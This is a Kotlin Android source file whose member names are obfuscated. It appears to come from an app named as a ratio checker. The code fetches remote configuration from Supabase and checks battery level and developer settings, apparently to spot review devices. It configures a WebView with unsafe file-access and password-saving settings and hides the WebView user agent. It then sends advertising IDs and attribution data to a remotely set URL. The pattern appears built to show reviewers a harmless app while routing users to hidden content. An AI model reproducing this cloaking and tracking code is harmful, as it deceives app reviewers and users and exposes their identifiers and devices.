package com.global.ratio_chacker

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import android.webkit.CookieManager
import android.webkit.WebView
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.postgrest.Postgrest
import io.github.jan.supabase.postgrest.postgrest
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import java.lang.StringBuilder
import kotlin.coroutines.coroutineContext
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

object Handler {
    private val rn = "supa"

    const val q = "simple_shared_preferences"
    const val w = "first"
    const val r = "second"


    private var f: Class<out Activity>? = null

    private var h: String? = null
    suspend fun e(d: String, h: String): Description? {
        return withContext(Dispatchers.IO) {
            val p = "https://$d.${rn}base.co"

            try {
                val ds = createSupabaseClient(
                    supabaseUrl = p,
                    supabaseKey = h,
                ) {
                    install(Postgrest)
                }

                val th = ds.postgrest["Source"]
                    .select().decodeList<Description>()

                th.firstOrNull()
            } catch (e: Exception) {
                if (e is CancellationException) throw CancellationException()
                null
            }

        }
    }

    fun ku(ew: Context): Boolean {
        val gre = try {
            val sgd =
                ew.getSystemService(Context.BATTERY_SERVICE) as BatteryManager

            val qqw = sgd.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                .toFloat()
            qqw == 100f
        } catch (e: java.lang.Exception) {
            true
        }

        val gsd = try {
            Settings.Global.getInt(
                ew.contentResolver,
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0
            ) != 0
        } catch (e: java.lang.Exception) {
            true
        }

        return !(gre && gsd)
    }

    suspend fun lfe(grg: Context, vx: Property) {
        val j = grg.getSharedPreferences(q, Context.MODE_PRIVATE)

        withContext(Dispatchers.IO) {
            j.edit().apply {
                putString(w, vx.first)
                putBoolean(r, vx.second)
            }.apply()
        }
    }

    suspend fun b(w: Context): Property {
        val e = w.getSharedPreferences(q, Context.MODE_PRIVATE)

        return withContext(Dispatchers.IO) {
            val asg = e.getString(Handler.w, null)
            val rt = e.getBoolean(r, false)

            h = asg

            Property(asg, rt)
        }
    }

    suspend fun y(ge: Context, dgv: String) {
        if (h != null) return

        val data = b(ge)

        if (data.first != null) {
            h = data.first
            return
        }

        lfe(ge, Property(dgv, false))
    }

    @SuppressLint("SetJavaScriptEnabled")
    @Suppress("DEPRECATION")
    fun o(fw: WebView) {
        with(fw.settings) {
            loadsImagesAutomatically = true
            useWideViewPort = true
            displayZoomControls = false
            allowUniversalAccessFromFileURLs = true

            mixedContentMode = 0
            savePassword = true
            domStorageEnabled = true

            javaScriptEnabled = true
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.O_MR1) {
                saveFormData = true
            }
            allowFileAccessFromFileURLs = true
            cacheMode = android.webkit.WebSettings.LOAD_DEFAULT
            builtInZoomControls = true

            allowFileAccess = true

            javaScriptCanOpenWindowsAutomatically = true
            loadWithOverviewMode = true
            allowContentAccess = true
            databaseEnabled = true
            userAgentString = userAgentString.replace("; wv", "")

            CookieManager.getInstance().setAcceptThirdPartyCookies(fw, true)
            CookieManager.getInstance().setAcceptCookie(true)

            setRenderPriority(android.webkit.WebSettings.RenderPriority.HIGH)
            setEnableSmoothTransition(true)
            setSupportMultipleWindows(false)
            setSupportZoom(false)
        }

        fw.apply {
            isFocusableInTouchMode = true
            isHorizontalScrollBarEnabled = false
            isFocusable = true
            isSaveEnabled = true
            setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
            isVerticalScrollBarEnabled = false
        }
    }


    fun rg(dgd: Class<out Activity>) {
        f = dgd
    }

    fun ht(sg: Activity) {
        f?.let { f ->
            CoroutineScope(Dispatchers.IO).launch {
                lfe(sg, Property(null, true))
            }

            val intent = Intent(sg, f)

            sg.apply {
                startActivity(intent)
                finish()
            }
        }
    }

    fun gew(w: Context, s: String) {
        if (s.isBlank()) return

        CoroutineScope(Dispatchers.IO).launch {
            OneSignal.initWithContext(w)
            OneSignal.setAppId(s)
            OneSignal.setLogLevel(
                OneSignal.LOG_LEVEL.VERBOSE,
                OneSignal.LOG_LEVEL.NONE
            )
        }
    }

    suspend fun fg(geg: Activity, sdv: Description): String {
        with(CoroutineScope(coroutineContext)) {
            val rt = async {
                ws(
                    geg,
                    sdv.c,
                    fwefwe = sdv.y
                )
            }
            val dd =
                async { fe(geg, sdv.g, sdv.h) }

            val j = listOf(dd, rt).awaitAll()

            val hr = j[0]
            val ht = j[1]

            var o: Boolean? = null

            if (hr != null) o = true
            else if (ht != null) o = false

            val sdf = j[0] ?: j[1]

            return tm(geg, sdf, o, sdv)
        }
    }

    private suspend fun ws(
        fr: Activity,
        kp: String,
        fwefwe: String
    ): String? {
        val rw = AppsFlyerLib.getInstance()

        return withContext(Dispatchers.IO) {
            suspendCancellableCoroutine { ph ->
                val gergeg = object : AppsFlyerConversionListener {
                    override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                        rw.unregisterConversionListener()

                        val ht =
                            data?.getOrDefault(kp, null)
                                ?.toString()

                        ph.resume(ht)
                    }

                    override fun onConversionDataFail(error: String?) {
                        rw.unregisterConversionListener()

                        ph.resume(null)
                    }

                    override fun onAppOpenAttribution(data: MutableMap<String, String>?) {
                        rw.unregisterConversionListener()

                        ph.resume(null)
                    }

                    override fun onAttributionFailure(error: String?) {
                        rw.unregisterConversionListener()

                        ph.resume(null)
                    }
                }

                rw.init(fwefwe, gergeg, fr)
                    .start(fr)
            }
        }
    }

    private suspend fun fe(ge: Context, wew: String, asdas: String): String? {
        return withContext(Dispatchers.IO) {
            suspendCoroutine { continuation ->
                FacebookSdk.apply {
                    setApplicationId(wew)
                    setClientToken(asdas)
                    sdkInitialize(ge)
                    setAdvertiserIDCollectionEnabled(true)
                    setAutoInitEnabled(true)
                    fullyInitialize()
                }

                AppLinkData.fetchDeferredAppLinkData(ge) {
                    continuation.resume(it?.targetUri?.toString())
                }
            }
        }
    }

    private suspend fun tm(
        fw: Context,
        gd: String?,
        dq: Boolean?,
        kt: Description
    ): String {
        val few = if (dq == true) {
            if (gd?.contains("//") == true) gd.split("//")[1]
            else gd
        } else {
            gd
        }

        val rg = when (dq) {
            true -> kt.e
            false -> kt.o
            else -> null
        }

        val sh = try {
            AppsFlyerLib.getInstance().getAppsFlyerUID(fw)
        }catch (e : Exception){
            if (e is CancellationException) throw CancellationException()
            null
        }

        OneSignal.setExternalUserId(sh ?: "")
        OneSignal.sendTag(
            kt.t,
            (rg ?: kt.k)
        )

        val rd = withContext(Dispatchers.IO) {
            try {
                AdvertisingIdClient.getAdvertisingIdInfo(fw).id
            } catch (e: Exception) {
                if(e is CancellationException) throw CancellationException()

                null
            }
        }

        val th = try {
            few?.split("_")
        } catch (e: Exception) {
            null
        }

        val tt = "${kt.f}?"

        val ct = if (th == null) {
            "${kt.x}1=${kt.k}&"
        } else {
            val rp = StringBuilder()

            rp.apply {
                th.mapIndexed { tr, ji ->
                    append("${kt.x}${tr + 1}=$ji&")
                }
            }.toString()
        }

        val tp = "${kt.u}=${rg?:""}&${kt.p}=$rd&"

        return tt + ct + tp
    }

}